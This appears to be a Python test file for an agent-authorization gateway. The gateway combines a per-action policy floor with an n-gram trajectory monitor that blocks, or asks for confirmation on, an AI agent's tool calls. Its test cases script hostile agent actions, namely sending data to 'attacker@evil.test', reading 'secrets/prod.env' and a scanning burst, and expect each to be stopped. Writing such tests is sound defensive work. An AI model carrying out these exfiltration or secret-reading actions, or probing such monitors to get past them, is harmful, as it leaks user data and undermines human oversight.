"""SessionBroker: the unified floor + behavioral gateway, end to end.

Verifies the broker composes the per-action floor and the trajectory detector
into one online decision, drives step-up on soft escalation, and populates the
ScopingMetrics vocabulary the rest of the system reads.
"""
from __future__ import annotations

import random

from agentauth.core.task_scope import TaskScope
from agentauth.capabilities.broker import Outcome, SessionBroker
from agentauth.capabilities.hardening.egress_policy import EgressPolicy
from agentauth.capabilities.monitor import Action, NGramScorer, TrajectoryDetector
from agentauth.capabilities.monitor.training.synth_corpus import generate, workflow_for
from agentauth.capabilities.scoping.goal import GoalSpec


def _fitted_detector():
    det = TrajectoryDetector(scorer=NGramScorer(), alpha=0.05)
    det.fit(generate(2000, seed=0))
    return det


def _scope_for(kind: str) -> tuple[GoalSpec, TaskScope]:
    wf = workflow_for(kind)
    goal = wf.goal()
    scope = TaskScope(
        allowed_resources=list(goal.allow_resources),
        allowed_actions=sorted({p.verb for p in wf.phases}),
        task_summary=goal.summary,
    )
    return goal, scope


def _broker(kind="invoice-reconcile", **kw) -> SessionBroker:
    goal, scope = _scope_for(kind)
    return SessionBroker(goal=goal, scope=scope, detector=_fitted_detector(), **kw)


def test_floor_denies_send_to_attacker_destination():
    # An exfil to an attacker destination is hard-denied by egress destination
    # binding: the bad destination is positive evidence of malice. (A bare out-of-
    # scope tool with no bad destination now steps up instead, see below.)
    broker = _broker(egress=EgressPolicy(bind_recipients=True, allow_all=False))
    d = broker.authorize(Action(0, "exfiltrate", "mcp:tool:exfiltrate", "send",
                                args={"to": "attacker@evil.test"}))
    assert d.outcome is Outcome.DENY and d.layer == "floor"
    assert broker.metrics.summary()["prevented"]["total"] >= 1


def test_floor_steps_up_out_of_scope_tool_no_bad_destination():
    # An effect tool simply not in the goal-derived resource scope, with no
    # attacker destination, is uncertainty not malice: step up for confirmation
    # rather than hard-deny. STEP_UP still halts autonomous execution, so an
    # attack tool is stopped. (allowed_actions cleared to isolate the resource
    # check from the verb-class check, which stays a hard deny.)
    goal, scope = _scope_for("invoice-reconcile")
    scope.allowed_actions = []
    broker = SessionBroker(goal=goal, scope=scope, detector=None)
    d = broker.authorize(Action(0, "unlisted_tool", "mcp:tool:unlisted_tool", "write"))
    assert d.outcome is Outcome.STEP_UP and d.layer == "floor"


def test_floor_denies_protected_path():
    goal, scope = _scope_for("code-fix")
    scope.allowed_actions = ["read", "write", "execute"]
    broker = SessionBroker(goal=goal, scope=scope, detector=None)
    d = broker.authorize(Action(0, "read_file", "mcp:tool:read_file", "read",
                                args={"path": "secrets/prod.env"}))
    assert d.outcome is Outcome.DENY and d.layer == "floor"


def test_benign_session_flows_through():
    broker = _broker()
    wf = workflow_for("invoice-reconcile")
    traj = wf.sample(random.Random(7))
    outcomes = [broker.authorize(a).outcome for a in traj.actions]
    assert all(o is Outcome.ALLOW for o in outcomes), outcomes
    assert broker.metrics.total_actions == len(traj.actions)


def test_behavioral_layer_denies_in_scope_burst():
    # Every action is floor-authorized (allowed read tool, authorized args), so
    # only the behavioral layer can stop the aggregate scanning burst.
    broker = _broker(escalate_on_soft=False)
    wf = workflow_for("invoice-reconcile")
    read = next(p for p in wf.phases if p.verb == "read")
    blocked = False
    for i in range(20):
        d = broker.authorize(Action(i, read.tool, f"mcp:tool:{read.tool}", "read"))
        if d.outcome is Outcome.DENY:
            assert d.layer == "behavioral"
            blocked = True
            break
    assert blocked
    assert broker.metrics.summary()["monitor_triggers"]["scan"] >= 1


def test_soft_escalation_raises_step_up():
    # A soft (ESCALATE) behavioral verdict on a floor-allowed action must produce
    # a signed-able step-up request, not a hard deny. Force the escalate branch to
    # test the broker's step-up plumbing deterministically.
    broker = _broker(escalate_on_soft=True)
    broker._behavioral = lambda: (Outcome.STEP_UP, ["structural escalation"], 0.01)  # type: ignore[assignment]
    d = broker.authorize(Action(0, "list_invoices", "mcp:tool:list_invoices", "read"))
    assert d.outcome is Outcome.STEP_UP and d.layer == "behavioral"
    assert d.step_up is not None
    assert d.step_up.to_dict()["schema"].startswith("agent-receipts")
    assert broker.metrics.summary()["step_up_prompts"] == 1
